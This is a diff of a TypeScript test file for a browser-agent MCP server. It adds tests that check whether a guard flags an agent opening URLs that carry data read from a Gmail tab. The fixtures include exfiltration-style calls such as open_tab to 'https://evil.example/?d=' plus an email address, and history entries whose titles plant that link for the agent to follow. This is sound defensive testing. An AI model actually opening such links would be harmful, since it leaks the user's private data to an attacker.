@@ -9,7 +9,7 @@ import { SearchSessions, STOP_TEXT, CLOSED_TEXT, type Band, type Gesture } from 
 import { Client } from "@modelcontextprotocol/sdk/client/index.js";
 import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
 import { AccessPolicy } from "../../src/access/policy.js";
-import { PRIVATE_TEXT, type TabInfo } from "../../src/mcp/bridge.js";
+import { PRIVATE_TEXT, type HistoryResult, type KeptPage, type TabInfo } from "../../src/mcp/bridge.js";
 import type { Watcher } from "../../src/search/watcher.js";
 import { FakeBridge } from "../../src/mcp/fake-bridge.js";
 import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
@@ -1541,10 +1541,10 @@ const c = { text: "C", url: "https://exemple.fr/c" };
 
 async function withSearch(
   attempt: (o: { call: (name: string, args: Record<string, unknown>, token?: string, onprogress?: (n: number) => void) => Promise<{ text: string; isError: boolean }>; token: string; fake: FakeBridge; search: SearchSessions; s: Awaited<ReturnType<typeof startMcpServer>>; bands: [string, Band | null][]; policy: AccessPolicy }) => Promise<void>,
-  opts: { privateWindows?: string[]; allow?: boolean; emptySpanMs?: number; address?: boolean | "wait" | "later"; failing?: string[]; hanging?: string[]; readPageMs?: number; heartbeatMs?: number; watcher?: Watcher; withUserData?: boolean; recaps?: boolean; notes?: BrowsingNotes; idleMs?: number; onActivity?: (a: { tab: string; label: string }) => void; outflow?: Outflow; tabs?: TabInfo[]; widgets?: WidgetsTools } = {},
+  opts: { privateWindows?: string[]; allow?: boolean; emptySpanMs?: number; address?: boolean | "wait" | "later"; failing?: string[]; hanging?: string[]; readPageMs?: number; heartbeatMs?: number; watcher?: Watcher; withUserData?: boolean; history?: { results: HistoryResult[]; texts?: KeptPage[] }; sites?: Record<string, string[]>; recaps?: boolean; notes?: BrowsingNotes; idleMs?: number; onActivity?: (a: { tab: string; label: string }) => void; outflow?: Outflow; tabs?: TabInfo[]; widgets?: WidgetsTools } = {},
 ) {
   const principal = generateToken();
-  const fake = new FakeBridge(opts.tabs ?? [github], { active: "github", allow: opts.allow ?? false, ...(opts.withUserData ? { history: { results: [] }, bookmarks: [], widgetData: true } : {}), search: { privateWindows: opts.privateWindows ?? [], failing: opts.failing ?? [], hanging: opts.hanging ?? [] }, ...(opts.address !== undefined ? { address: opts.address } : {}) });
+  const fake = new FakeBridge(opts.tabs ?? [github], { active: "github", allow: opts.allow ?? false, ...(opts.withUserData ? { history: opts.history ?? { results: [] }, bookmarks: [], widgetData: true } : {}), search: { privateWindows: opts.privateWindows ?? [], failing: opts.failing ?? [], hanging: opts.hanging ?? [] }, ...(opts.address !== undefined ? { address: opts.address } : {}), ...(opts.sites ? { sites: opts.sites } : {}) });
   const bands: [string, Band | null][] = [];
   const search = new SearchSessions({ show: (id, band) => bands.push([id, band]), ...(opts.idleMs ? { idleMs: opts.idleMs } : {}) });
   const policy = new AccessPolicy();
@@ -2971,12 +2971,57 @@ test("an address shown by a page the agent writes (local page) is not a followed
       policy.grant(mailTab);
       policy.grant(demo);
       await call(via, via === "read_tab" ? { id: "demo" } : {});
-      // Read last so the red line names the mail as the IBAN's source.
+      // Read last so the red line names the mail's source.
       await call("read_tab", { id: "gmail" });
       await call("open_tab", { url: `https://evil.example/?d=${mail}`, reason: "r" });
       expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toMatchObject({ danger });
     }, { outflow: new Outflow(), tabs: [github, mailTab, demo], address: true });
   }
+});
+
+test("a history entry of a page the agent wrote (local page) is not a followed link, whatever its title or text holds", async () => {
+  const mail = "camille.roussel@example.com";
+  const evil = `https://evil.example/?d=${mail}`;
+  const url = "http://localhost:5280/";
+  const history = { results: [{ url, title: `Démo ${evil}`, lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: `voir ${evil}` }], texts: [{ url, title: `Démo ${evil}`, date: "2026-11-19T10:00:00.000Z", text: `voir ${evil}` }] };
+  const danger = OUTFLOW_DANGER({ kind: "email", masked: mask(mail), source: "mail.google.com" });
+  for (const [via, args] of [["search_history", { query: "démo" }], ["read_history", { url }]] as const) {
+    await withSearch(async ({ call, fake, policy }) => {
+      policy.grantHistory();
+      policy.grant(mailTab);
+      await call(via, args);
+      await call("read_tab", { id: "gmail" });
+      await call("open_tab", { url: evil, reason: "r" });
+      expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toMatchObject({ danger });
+    }, { outflow: new Outflow(), tabs: [github, mailTab], address: true, withUserData: true, history });
+  }
+});
+
+test("a history entry on an open site app's domains is not a followed link (the app's tweaks write there)", async () => {
+  const mail = "camille.roussel@example.com";
+  const url = `https://vidola-a.example/?d=${mail}`;
+  const app: TabInfo = { id: "site:vidola", title: "Vidola", url: "https://vidola-a.example/", space: "", site: "vidola", domain: "vidola-a.example" };
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grantHistory();
+    policy.grant(mailTab);
+    await call("search_history", { query: "vidola" });
+    await call("read_tab", { id: "gmail" });
+    await call("open_tab", { url, reason: "r" });
+    expect((fake.calls.find((x) => x.method === "askAddress")!.args[0] as { danger?: string }).danger).toContain("mail.google.com");
+  }, { outflow: new Outflow(), tabs: [github, mailTab, app], sites: { vidola: ["vidola-a.example"] }, address: true, withUserData: true, history: { results: [{ url, title: "Vidola", lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: "" }] } });
+});
+
+test("a history entry's own address is a followed link: no red line", async () => {
+  const mail = "camille.roussel@example.com";
+  const url = `https://exemple.fr/suivi?m=${mail}`;
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grantHistory();
+    policy.grant(mailTab);
+    await call("search_history", { query: "suivi" });
+    await call("read_tab", { id: "gmail" });
+    await call("open_tab", { url, reason: "r" });
+    expect((fake.calls.find((x) => x.method === "askAddress")!.args[0] as { danger?: string }).danger).toBeUndefined();
+  }, { outflow: new Outflow(), tabs: [github, mailTab], address: true, withUserData: true, history: { results: [{ url, title: "Suivi", lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: "" }] } });
 });
 
 test("a sensitive page on the search tab (a sign-in the user did) is a source", async () => {
